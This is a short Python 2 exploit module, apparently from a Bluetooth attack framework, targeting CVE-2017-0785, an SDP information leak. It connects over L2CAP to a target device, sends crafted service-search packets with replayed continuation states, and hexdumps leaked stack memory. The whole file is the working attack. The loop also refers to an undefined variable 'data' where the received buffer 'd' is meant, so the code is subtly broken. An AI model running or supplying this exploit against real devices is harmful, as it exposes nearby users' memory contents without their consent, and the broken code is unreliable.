from ..Exploit import Exploit
from pwn import *
from bluetooth import BluetoothSocket, L2CAP, set_l2cap_mtu


# sdp memory leak
class CVE20170785(Exploit):
    manufacturers = {

    }  # todo

    mtu = 50
    service_long = 0x0100
    service_short = 0x0001
    rounds = 50

    def __init__(self):
        Exploit.__init__(self)

    def exploit(self, address):
        s = BluetoothSocket(L2CAP)
        set_l2cap_mtu(s, self.mtu)
        context.endian = 'big'
        s.connect((address, 1))
        s.send(self.packet(self.service_long, '\x00'))
        d = s.recv(self.mtu)
        if d[-3] != '\x02':
            print "wrong continuation state received"
        stack = ''
        for i in range(1, self.rounds):
            s.send(CVE20170785.packet(self.service_short, data[-3:]))
            d = s.recv(self.mtu)
            stack += d[9:-3]
        s.close()
        return hexdump(stack)

    @staticmethod
    def packet(service, continuation_state):
        pkt = '\x02\x00\x00'
        pkt += p16(7 + len(continuation_state))
        pkt += '\x35\x03\x19'
        pkt += p16(service)
        pkt += '\x01\x00'
        pkt += continuation_state
        return pkt
